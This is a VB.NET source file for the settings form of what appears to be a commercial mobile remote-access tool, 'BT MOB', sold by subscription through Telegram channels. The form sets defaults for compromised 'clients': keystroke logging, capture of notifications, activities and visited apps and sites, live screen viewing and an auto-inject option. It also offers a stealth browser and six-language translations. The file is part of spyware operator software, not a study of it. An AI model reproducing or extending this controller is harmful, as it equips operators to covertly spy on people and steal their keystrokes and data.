Imports System.Runtime.Remoting.Contexts
Imports System.Web.UI.WebControls
Imports Newtonsoft.Json

Public Class settingsfrm

    Private onloading As Boolean = True
    Private Sub translateme()
        redctitle.Text = redclinkstr
        hidempfolde.Text = "Hide empty folder"
        hidempfile.Text = "Hide Empty Files (0 Bytes)"
        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"
                profbtn.Text = "الملف الشخصي"
                notbtn.Text = "الإشعارات"
                filesbtn.Text = "مدير الملفات"
                brwsbtn.Text = "المتصفح"
                aboutbtn.Text = "حول"
                nedactbtn.Text = "المعرف الشخصي"
                DrakeUIButtonIcon7.Text = "البريد الإلكتروني"
                DrakeUIButtonIcon8.Text = "الاشتراك"
                DrakeUIButtonIcon9.Text = "تاريخ الإنتهاء"
                Label20.Text = "عام"

                DrakeUISymbolLabel1.Text = "حفظ البيانات تلقائيًا"
                Label15.Text = "الإعدادات الافتراضية"
                DrakeUISymbolLabel26.Text = "الشاشة المباشرة"
                DrakeUISymbolLabel14.Text = "تسجيل ضغطات المفاتيح"
                DrakeUISymbolLabel15.Text = "تسجيل التنبيهات"
                DrakeUISymbolLabel16.Text = "تسجيل النشاطات"
                DrakeUISymbolLabel17.Text = "تسجيل زيارات التطبيقات"
                DrakeUISymbolLabel18.Text = "تسجيل زيارات المواقع"
                DrakeUISymbolLabel19.Text = "التنبيهات المباشرة"
                Label14.Text = "المتصفح الخفي"
                Label12.Text = "وكيل المستخدم"
                Label10.Text = "عام"
                Label11.Text = "وضع العرض"
                Label9.Text = "تحميل الصور المصغرة تلقائيًا"
                Label3.Text = "إظهار التنبيهات"
                Label4.Text = "عميل جديد"
                Label5.Text = "انقطاع الاتصال"
                Label6.Text = "انتهاء التحميل"
                Label7.Text = "تنبيهات العملاء"

                Label1.Text = "الأصوات"
                maintitle.Text = "تنبيه صوتي"
                Label2.Text = "صوت التنبيه"
                Label23.Text = "الاتصال مع المسؤولين" 'contact with admins
                loutbtn.Text = "تسجيل الخروج"

                Exit Select
            Case "CN" ' Chinese
                profbtn.Text = "个人资料"
                notbtn.Text = "通知"
                filesbtn.Text = "文件管理器"
                brwsbtn.Text = "浏览器"
                aboutbtn.Text = "关于"
                DrakeUISymbolLabel1.Text = "自动保存数据"
                Label15.Text = "默认选项"
                DrakeUISymbolLabel26.Text = "实时屏幕"
                DrakeUISymbolLabel14.Text = "按键记录"
                DrakeUISymbolLabel15.Text = "记录警报"
                DrakeUISymbolLabel16.Text = "记录活动"
                DrakeUISymbolLabel17.Text = "记录应用访问"
                DrakeUISymbolLabel18.Text = "记录网站访问"
                DrakeUISymbolLabel19.Text = "实时警报"
                Label14.Text = "隐身浏览器"
                Label12.Text = "用户代理"
                Label10.Text = "通用"
                Label11.Text = "显示模式"
                Label9.Text = "自动加载缩略图"
                Label3.Text = "显示警报"
                Label4.Text = "新客户"
                Label5.Text = "连接中断"
                Label6.Text = "下载完成"
                Label7.Text = "客户警报"

                Label1.Text = "声音"
                maintitle.Text = "声音警报"
                Label2.Text = "警报声音"
                Label23.Text = "联系管理员"
                loutbtn.Text = "登出"
                Exit Select
            Case "RU" ' Russian
                profbtn.Text = "Профиль"
                notbtn.Text = "Уведомления"
                filesbtn.Text = "Файловый менеджер"
                brwsbtn.Text = "Браузер"
                aboutbtn.Text = "О программе"
                DrakeUISymbolLabel1.Text = "Автосохранение данных"
                Label15.Text = "Настройки по умолчанию"
                DrakeUISymbolLabel26.Text = "Живой экран"
                DrakeUISymbolLabel14.Text = "Запись нажатий клавиш"
                DrakeUISymbolLabel15.Text = "Запись оповещений"
                DrakeUISymbolLabel16.Text = "Запись активности"
                DrakeUISymbolLabel17.Text = "Запись посещений приложений"
                DrakeUISymbolLabel18.Text = "Запись посещений сайтов"
                DrakeUISymbolLabel19.Text = "Прямые оповещения"
                Label14.Text = "Режим инкогнито"
                Label12.Text = "Пользовательский агент"
                Label10.Text = "Общие"
                Label11.Text = "Режим отображения"
                Label9.Text = "Автозагрузка миниатюр"
                Label3.Text = "Показывать оповещения"
                Label4.Text = "Новый клиент"
                Label5.Text = "Разрыв соединения"
                Label6.Text = "Загрузка завершена"
                Label7.Text = "Оповещения клиентов"

                Label1.Text = "Звуки"
                maintitle.Text = "Звуковое оповещение"
                Label2.Text = "Звук оповещения"
                Label23.Text = "Связь с администраторами"
                loutbtn.Text = "выйти из системы"
                Exit Select
            Case "TR" ' Turkish
                profbtn.Text = "Profil"
                notbtn.Text = "Bildirimler"
                filesbtn.Text = "Dosya Yöneticisi"
                brwsbtn.Text = "Tarayıcı"
                aboutbtn.Text = "Hakkında"
                DrakeUISymbolLabel1.Text = "Verileri Otomatik Kaydet"
                Label15.Text = "Varsayılan Ayarlar"
                DrakeUISymbolLabel26.Text = "Canlı Ekran"
                DrakeUISymbolLabel14.Text = "Tuş Kaydı"
                DrakeUISymbolLabel15.Text = "Uyarı Kaydı"
                DrakeUISymbolLabel16.Text = "Etkinlik Kaydı"
                DrakeUISymbolLabel17.Text = "Uygulama Ziyaretlerini Kaydet"
                DrakeUISymbolLabel18.Text = "Web Sitesi Ziyaretlerini Kaydet"
                DrakeUISymbolLabel19.Text = "Canlı Uyarılar"
                Label14.Text = "Gizli Tarayıcı"
                Label12.Text = "Kullanıcı Aracısı"
                Label10.Text = "Genel"
                Label11.Text = "Görüntüleme Modu"
                Label9.Text = "Küçük Resimleri Otomatik Yükle"
                Label3.Text = "Uyarıları Göster"
                Label4.Text = "Yeni Müşteri"
                Label5.Text = "Bağlantı Kesildi"
                Label6.Text = "İndirme Tamamlandı"
                Label7.Text = "Müşteri Uyarıları"

                Label1.Text = "Sesler"
                maintitle.Text = "Sesli Uyarı"
                Label2.Text = "Uyarı Sesi"
                Label23.Text = "Yöneticilerle İletişim"
                loutbtn.Text = "Çıkış yap"
                Exit Select
            Case "SP" ' Spanish
                profbtn.Text = "Perfil"
                notbtn.Text = "Notificaciones"
                filesbtn.Text = "Administrador de Archivos"
                brwsbtn.Text = "Navegador"
                aboutbtn.Text = "Acerca de"
                DrakeUISymbolLabel1.Text = "Guardar datos automáticamente"
                Label15.Text = "Opciones predeterminadas"
                DrakeUISymbolLabel26.Text = "Pantalla en Vivo"
                DrakeUISymbolLabel14.Text = "Grabación de teclas"
                DrakeUISymbolLabel15.Text = "Registro de alertas"
                DrakeUISymbolLabel16.Text = "Registro de actividades"
                DrakeUISymbolLabel17.Text = "Registro de aplicaciones visitadas"
                DrakeUISymbolLabel18.Text = "Registro de sitios visitados"
                DrakeUISymbolLabel19.Text = "Alertas en Vivo"
                Label14.Text = "Navegador Incógnito"
                Label12.Text = "Agente de Usuario"
                Label10.Text = "General"
                Label11.Text = "Modo de Visualización"
                Label9.Text = "Cargar Miniaturas Automáticamente"
                Label3.Text = "Mostrar Alertas"
                Label4.Text = "Nuevo Cliente"
                Label5.Text = "Conexión Perdida"
                Label6.Text = "Descarga Completa"
                Label7.Text = "Alertas de Clientes"

                Label1.Text = "Sonidos"
                maintitle.Text = "Alerta Sonora"
                Label2.Text = "Sonido de Alerta"
                Label23.Text = "Contacto con Administradores"
                loutbtn.Text = "cerrar sesión"
                Exit Select

            Case "PR" ' Brazilian Portuguese
                profbtn.Text = "Perfil"
                notbtn.Text = "Notificações"
                filesbtn.Text = "Gerenciador de Arquivos"
                brwsbtn.Text = "Navegador"
                aboutbtn.Text = "Sobre"
                DrakeUISymbolLabel1.Text = "Salvar dados automaticamente"
                Label15.Text = "Opções Padrão"
                DrakeUISymbolLabel26.Text = "Tela ao Vivo"
                DrakeUISymbolLabel14.Text = "Gravação de Teclas"
                DrakeUISymbolLabel15.Text = "Registro de Alertas"
                DrakeUISymbolLabel16.Text = "Registro de Atividades"
                DrakeUISymbolLabel17.Text = "Registro de Visitas de Aplicativos"
                DrakeUISymbolLabel18.Text = "Registro de Visitas de Sites"
                DrakeUISymbolLabel19.Text = "Alertas ao Vivo"
                Label14.Text = "Navegador Anônimo"
                Label12.Text = "Agente do Usuário"
                Label10.Text = "Geral"
                Label11.Text = "Modo de Exibição"
                Label9.Text = "Carregar Miniaturas Automaticamente"
                Label3.Text = "Exibir Alertas"
                Label4.Text = "Novo Cliente"
                Label5.Text = "Conexão Perdida"
                Label6.Text = "Download Concluído"
                Label7.Text = "Alertas de Clientes"

                Label1.Text = "Sons"
                maintitle.Text = "Alerta Sonoro"
                Label2.Text = "Som de Alerta"
                Label23.Text = "Contato com Administradores"
                loutbtn.Text = "sair"
                Exit Select

            Case Else
                ' Handle any other cases or defaults here
        End Select
    End Sub
    Private Sub Label1_MouseDown(sender As Object, e As MouseEventArgs) Handles titlestng.MouseDown
        Try
            If e.Button = Windows.Forms.MouseButtons.Left Then
                ReleaseCapture()
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub DrakeUIButtonIcon2_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon2.Click
        Me.Close()
    End Sub

    Private Sub settingsfrm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        idtextstn.Text = BTEngine.u_uid
        emlstng.Text = BTEngine.u_email
        sharelink.Text = BTEngine.share_link
        substypstn.Text = "Elite"
        exptxtstn.Text = BTEngine.u_exp

        checknewcli.Active = BTRegistry.ReadBool(BTSettings.Notify_newcli)

        checkplaysound.Active = BTRegistry.ReadBool(BTSettings.Use_sound)
        checkfromclnt.Active = BTRegistry.ReadBool(BTSettings.Notify_mobs)
        checkdowns.Active = BTRegistry.ReadBool(BTSettings.Notify_downloads)
        checkdiscon.Active = BTRegistry.ReadBool(BTSettings.Notify_disconnect)
        Dim notfyname As String = BTRegistry.GetValue(Regz.notify_sund, "1")

        Dim useragent As String = BTRegistry.GetValue(BTSettings.UserAgent, "m")

        Select Case useragent
            Case "a"
                combouagents.Text = "Automatic"
            Case "m"
                combouagents.Text = "Mobile Default"
            Case Else
                combouagents.Text = "Custom"
                agenttext.Text = useragent.Replace("<c>", "")
                agenttext.Visible = True
                savecagent.Visible = True
        End Select


        Dim curentoptions As String = BTRegistry.GetValue(BTSettings.Defconfig, My.Resources.Deafult_mob_optns)

        Dim optionjson As Dictionary(Of String, Object) = JsonConvert.DeserializeObject(Of Dictionary(Of String, Object))(curentoptions)
        Dim reco_activitys As String = If(optionjson.ContainsKey("Activities"), optionjson("Activities"), "0")
        Dim reco_keys As String = If(optionjson.ContainsKey("keystrokes"), optionjson("keystrokes"), "0")
        Dim reco_notifys As String = If(optionjson.ContainsKey("notifications"), optionjson("notifications"), "0")
        Dim reco_vapps As String = If(optionjson.ContainsKey("visitedapps"), optionjson("visitedapps"), "0")
        Dim reco_vlinks As String = If(optionjson.ContainsKey("visitedlinks"), optionjson("visitedlinks"), "0")
        Dim liv_notifys As String = If(optionjson.ContainsKey("livenotify"), optionjson("livenotify"), "0")
        Dim live_screen As String = If(optionjson.ContainsKey("livescreen"), optionjson("livescreen"), "0")
        Dim auto_ject As String = If(optionjson.ContainsKey("autoj"), optionjson("autoj"), "0")

        If reco_keys = "1" Then
            checkkeys.Active = True
        End If
        If reco_notifys = "1" Then
            checkRnotfy.Active = True
        End If

        If reco_activitys = "1" Then
            checkRactv.Active = True
        End If

        If reco_vapps = "1" Then
            chkRvapps.Active = True
        End If

        If reco_vlinks = "1" Then
            checkRvlinks.Active = True
        End If


        If liv_notifys = "1" Then
            chkLivnotify.Active = True
        End If

        If live_screen = "1" Then
            chkscrns.Active = True
        End If
        If auto_ject = "1" Then
            checkautoject.Active = True

        End If


        Select Case BTRegistry.GetValue(BTSettings.fileviewstyle, "1")
            Case "1"
                combovewfiles.Text = "List view"
            Case "2"
                combovewfiles.Text = "Large icons"
        End Select


        Label19.Text = $"• {verstr} : v{CurrentVersion} / {ReleaseDate}"


        translateme()

        checkloadthumb.Active = BTRegistry.ReadBool(BTSettings.autothumbs, True)
        checkautosave.Active = BTRegistry.ReadBool(BTSettings.autosave, True)


        checkhideEfolder.Active = BTRegistry.ReadBool(BTSettings.hideEfolder, False)
        checkhideEfile.Active = BTRegistry.ReadBool(BTSettings.hideEfiles, False)

        soundcombo.Text = notfyname
        onloading = False
    End Sub

    Private Sub entrbtn_Click(sender As Object, e As EventArgs) Handles profbtn.Click
        panel_profile.BringToFront()
        titlestng.Text = BTConst.Settingsstr & " | " & BTConst.Profilestr
    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles notbtn.Click
        panel_notfy.BringToFront()
        titlestng.Text = BTConst.Settingsstr & " | " & BTConst.Notificationsstr
    End Sub



    Private Sub DrakeUIButtonIcon3_Click(sender As Object, e As EventArgs) Handles filesbtn.Click
        panel_fils.BringToFront()
        titlestng.Text = BTConst.Settingsstr & " | " & BTConst.Filesmanagestr
    End Sub



    Private Sub DrakeUIButtonIcon6_Click(sender As Object, e As EventArgs) Handles aboutbtn.Click
        panel_about.BringToFront()
        titlestng.Text = BTConst.Settingsstr & " | " & BTConst.Aboutstr
    End Sub

    Private Sub DrakeUIComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles soundcombo.SelectedIndexChanged

        BTRegistry.AddOrUpdateValue(Regz.notify_sund, soundcombo.Text)
        PlayNotificationSound()


    End Sub

    Private Sub checkplaysound_MouseClick(sender As Object, e As MouseEventArgs) Handles checkplaysound.MouseClick
        BTRegistry.WriteBool(BTRegistry.BTSettings.Use_sound, checkplaysound.Active)
    End Sub


    Private Sub checkfromclnt_MouseClick(sender As Object, e As MouseEventArgs) Handles checkfromclnt.MouseClick
        BTRegistry.WriteBool(BTRegistry.BTSettings.Notify_mobs, checkfromclnt.Active)
    End Sub

    Private Sub checkdowns_MouseClick(sender As Object, e As MouseEventArgs) Handles checkdowns.MouseClick
        BTRegistry.WriteBool(BTRegistry.BTSettings.Notify_downloads, checkdowns.Active)
    End Sub

    Private Sub checkdiscon_MouseClick(sender As Object, e As MouseEventArgs) Handles checkdiscon.MouseClick
        BTRegistry.WriteBool(BTRegistry.BTSettings.Notify_disconnect, checkdiscon.Active)
    End Sub

    Private Sub checknewcli_MouseClick(sender As Object, e As MouseEventArgs) Handles checknewcli.MouseClick
        BTRegistry.WriteBool(BTRegistry.BTSettings.Notify_newcli, checknewcli.Active)
    End Sub

    Private Sub DrakeUIButtonIcon15_Click(sender As Object, e As EventArgs) Handles brwsbtn.Click

        panel_web.BringToFront()
        titlestng.Text = BTConst.Settingsstr & " | " & BTConst.Browserstr
    End Sub

    Private Sub combouagents_SelectedIndexChanged(sender As Object, e As EventArgs) Handles combouagents.SelectedIndexChanged
        Select Case combouagents.Text
            Case "Automatic"
                agenttext.Visible = False
                savecagent.Visible = False
                BTRegistry.AddOrUpdateValue(BTSettings.UserAgent, "a")
            Case "Custom"
                agenttext.Visible = True
                savecagent.Visible = True
                BTRegistry.AddOrUpdateValue(BTSettings.UserAgent, "<c>" + agenttext.Text)
            Case Else
                agenttext.Visible = False
                savecagent.Visible = False
                BTRegistry.AddOrUpdateValue(BTSettings.UserAgent, "m")
        End Select
    End Sub

    Private Sub agenttext_TextChanged(sender As Object, e As EventArgs) Handles agenttext.TextChanged
        If agenttext.Text.Length > 0 Then
            savecagent.Enabled = True
        Else
            savecagent.Enabled = False
        End If
    End Sub

    Private Sub savecagent_Click(sender As Object, e As EventArgs) Handles savecagent.Click
        If agenttext.Text.Length > 0 Then
            BTRegistry.AddOrUpdateValue(BTSettings.UserAgent, "<c>" + agenttext.Text)
        Else
            BTAlerter.infos("Enter new user agent")
        End If
    End Sub

    Private Sub checkkeys_ValueChanged(sender As Object, value As Boolean) Handles checkkeys.ValueChanged
        If onloading Then
            Return
        End If
        If value Then
            UpdateOption("keystrokes", "1")
        Else
            UpdateOption("keystrokes", "0")
        End If
    End Sub

    Private Sub checkRnotfy_ValueChanged(sender As Object, value As Boolean) Handles checkRnotfy.ValueChanged
        If onloading Then
            Return
        End If
        If value Then
            UpdateOption("notifications", "1")
        Else
            UpdateOption("notifications", "0")
        End If
    End Sub

    Private Sub checkRactv_ValueChanged(sender As Object, value As Boolean) Handles checkRactv.ValueChanged
        If onloading Then
            Return
        End If

        If value Then
            UpdateOption("Activities", "1")
        Else
            UpdateOption("Activities", "0")
        End If
    End Sub

    Private Sub chkRvapps_ValueChanged(sender As Object, value As Boolean) Handles chkRvapps.ValueChanged
        If onloading Then
            Return
        End If
        If value Then
            UpdateOption("visitedapps", "1")
        Else
            UpdateOption("visitedapps", "0")
        End If
    End Sub

    Private Sub checkRvlinks_ValueChanged(sender As Object, value As Boolean) Handles checkRvlinks.ValueChanged
        If onloading Then
            Return
        End If
        If value Then
            UpdateOption("visitedlinks", "1")
        Else
            UpdateOption("visitedlinks", "0")
        End If
    End Sub

    Private Sub chkLivnotify_ValueChanged(sender As Object, value As Boolean) Handles chkLivnotify.ValueChanged
        If onloading Then
            Return
        End If
        If value Then
            UpdateOption("livenotify", "1")
        Else
            UpdateOption("livenotify", "0")
        End If
    End Sub
    Private Sub chkscrns_ValueChanged(sender As Object, value As Boolean) Handles chkscrns.ValueChanged
        If onloading Then
            Return
        End If
        If value Then
            UpdateOption("livescreen", "1")

        Else
            UpdateOption("livescreen", "0")

        End If
    End Sub
    Public Sub UpdateOption(key As String, value As String)
        Try
            Dim curentoptions As String = BTRegistry.GetValue(BTSettings.Defconfig, My.Resources.Deafult_mob_optns)

            Dim options As Dictionary(Of String, String) = JsonConvert.DeserializeObject(Of Dictionary(Of String, String))(curentoptions)

            ' Update or add the key-value pair
            If options.ContainsKey(key) Then
                options(key) = value
            Else
                options.Add(key, value)
            End If

            ' Write updated JSON back to file
            Dim updatedJson As String = JsonConvert.SerializeObject(options, Formatting.None)
            BTRegistry.AddOrUpdateValue(BTSettings.Defconfig, updatedJson)
        Catch ex As Exception
            ' Handle exception as needed
        End Try
    End Sub

    Private Sub DrakeUIComboBox1_SelectedIndexChanged_1(sender As Object, e As EventArgs) Handles combovewfiles.SelectedIndexChanged
        If onloading Then
            Return
        End If

        Select Case combovewfiles.Text
            Case "List view"
                BTRegistry.AddOrUpdateValue(BTSettings.fileviewstyle, "1")
            Case "Large icons"
                BTRegistry.AddOrUpdateValue(BTSettings.fileviewstyle, "2")
        End Select
    End Sub

    Private Sub checkloadthumb_ValueChanged(sender As Object, value As Boolean) Handles checkloadthumb.ValueChanged
        If onloading Then
            Return
        End If

        BTRegistry.WriteBool(BTSettings.autothumbs, value)

    End Sub

    Private Sub checkautosave_ValueChanged(sender As Object, value As Boolean) Handles checkautosave.ValueChanged
        If onloading Then
            Return
        End If

        BTRegistry.WriteBool(BTSettings.autosave, value)

    End Sub
    Private Sub starturl(str As String)
        Try
            Process.Start(str)
        Catch ex As Exception

        End Try
    End Sub

    Private Sub DrakeUIImageButton7_Click(sender As Object, e As EventArgs) Handles DrakeUIImageButton7.Click
        starturl("https://t.me/BT_MOB_TR")

    End Sub

    Private Sub DrakeUIImageButton6_Click(sender As Object, e As EventArgs) Handles DrakeUIImageButton6.Click
        starturl("https://t.me/BT_MOB_EN")

    End Sub

    Private Sub DrakeUIImageButton5_Click(sender As Object, e As EventArgs) Handles DrakeUIImageButton5.Click
        starturl("https://t.me/BT_MOB_SP")

    End Sub

    Private Sub DrakeUIImageButton4_Click(sender As Object, e As EventArgs) Handles DrakeUIImageButton4.Click
        starturl("https://t.me/BT_MOB_PR")

    End Sub

    Private Sub DrakeUIImageButton3_Click(sender As Object, e As EventArgs) Handles DrakeUIImageButton3.Click
        starturl("https://t.me/BT_MOB_RU")

    End Sub

    Private Sub DrakeUIImageButton2_Click(sender As Object, e As EventArgs) Handles DrakeUIImageButton2.Click
        starturl("https://t.me/BT_MOB_ZH")

    End Sub

    Private Sub DrakeUIImageButton1_Click(sender As Object, e As EventArgs) Handles DrakeUIImageButton1.Click
        starturl("https://t.me/BT_MOB_AR")
    End Sub

    Private Sub checkautoject_ValueChanged(sender As Object, value As Boolean) Handles checkautoject.ValueChanged
        If onloading Then
            Return
        End If
        If value Then
            UpdateOption("autoj", "1")
        Else
            UpdateOption("autoj", "0")
        End If
    End Sub

    Private Sub entrbtn_Click_1(sender As Object, e As EventArgs) Handles entrbtn.Click
        System.Windows.Forms.Clipboard.SetText(sharelink.Text)
        BTAlerter.Success("Copied")
    End Sub

    Private Sub DrakeUIButtonIcon4_Click(sender As Object, e As EventArgs) Handles loutbtn.Click

        If MyMsg.Show(myname, wannalogutstr, msgtype.errors, True) = DialogResult.OK Then
            My.Settings.lastkey = ""
            My.Settings.Save()
            BTEngine.MainForm.Close()
        End If

    End Sub

    Private Sub DrakeUIOSSwitch1_ValueChanged(sender As Object, value As Boolean) Handles checkhideEfolder.ValueChanged
        If onloading Then
            Return
        End If

        BTRegistry.WriteBool(BTSettings.hideEfolder, value)

    End Sub

    Private Sub checkhideEfile_ValueChanged(sender As Object, value As Boolean) Handles checkhideEfile.ValueChanged
        If onloading Then
            Return
        End If

        BTRegistry.WriteBool(BTSettings.hideEfiles, value)

    End Sub
End Class